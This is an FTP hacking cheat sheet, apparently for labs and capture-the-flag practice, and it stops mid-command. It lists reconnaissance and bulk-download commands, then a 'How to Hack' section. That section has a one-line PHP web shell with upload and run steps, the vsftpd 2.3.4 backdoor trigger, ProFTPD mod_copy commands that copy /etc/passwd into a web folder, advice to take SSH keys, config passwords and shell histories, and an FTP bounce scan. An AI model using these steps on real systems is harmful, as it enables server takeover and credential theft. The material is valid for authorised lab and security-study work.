### 1. Connection and Reconnaissance (Terminal)

- `ftp IP_ADDRESS` — standard connection.
- `ftp -a IP_ADDRESS` — quick anonymous login (login: `anonymous`, password blank).
- `nc -vn IP_ADDRESS 21` — reading banner via Netcat (displays the exact version, for example, _vsftpd 2.3.4_).
- `nmap -sV -sC -p 21 IP_ADDRESS` — standard scan with basic scripts (will immediately check the version and anonymous login).
- `nmap --script ftp-* -p 21 IP_ADDRESS` — run **all** FTP scripts (search for known backdoors and vulnerabilities).
### 2. Navigating within the ftp shell

- `passive` (or `pass`) — **[IMPORTANT]** switch to passive mode. If the console freezes when entering the `ls` command, simply enter `passive` — this bypasses firewall issues.
- `ls -al` — show all files, including hidden ones (those starting with a dot).
- `cd folder_name` / `cd ..` — navigate through folders / move up one level.
- `pwd` / `lcd /root/` — show a remote folder / change the local download folder.
### 3. Downloading and Uploading (CRUD)

- `binary` (or `bin`) — **MANDATORY** before downloading archives, images, and `.exe` files, to avoid corrupting their encoding.
- `get file` / `put file` — download / upload a single file. - `prompt` — Disable the `[Y/n]` prompt when bulk downloading.
- `mget *` / `mput *` — Download/upload the entire contents of a folder.
- `wget -m ftp://anonymous:anonymous@IP_ADDRESS` — (from a Linux terminal) Recursively download the entire FTP server and all its folders with a single command.
### 4. Hacking Tips and Attack Vectors (How to Hack)

**Vector A: FTP + Web (Shell Filling)** If the FTP server shares the same folder with the web server (for example, you see the `www`, `html`, `htdocs` folders), and you have write permissions (`put`):

1. Create a local `shell.php` file with the following code: `<?php system($_GET['cmd']); ?>`
2. Upload it via FTP: `put shell.php`
3. Open it in a browser: `http://IP_ADDRESS/shell.php?cmd=id` and execute commands on the server.
**Vector B: Exploitation of Known Versions (CVE)** If `nmap` or `nc` show a specific server version, immediately go to `searchsploit` or Google. Most common visitors to medium-sized labs:

- **vsftpd 2.3.4:** Contains a backdoor. Entering the `:)` smiley when logging in opens a root shell on port 6200 on the server. It can be hacked using Metasploit (`exploit/unix/ftp/vsftpd_234_backdoor`).
- **ProFTPD 1.3.5 (mod_copy):** This vulnerability allows copying server files without authorization. You can copy /etc/passwd or root's private SSH key to a web directory and then download it through a browser.
- Commands without authorization (via nc): SITE CPFR /etc/passwd (what to copy), then SITE CPTO /var/www/html/passwd.txt (where to copy).

**Vector B: Data Leaks (Internal Reconnaissance)** Even with anonymous privileges, look for critical files:

- .ssh/ folder — download id_rsa (private key) to log in via SSH without a password.
- config.php and web.config files — these often contain database passwords (which also work with SSH).
- .bash_history files — the admin command history; passwords are often found there.

**Vector G: FTP Bounce Attack (FTP Proxying)** If a server is vulnerable to a bounce attack, it can be used as a proxy to scan internal ports that are closed by an external firewall.

- Command: `nmap -Pn -b username:password@IP_FTP_SERVER_TARGET_IP_FTP ...
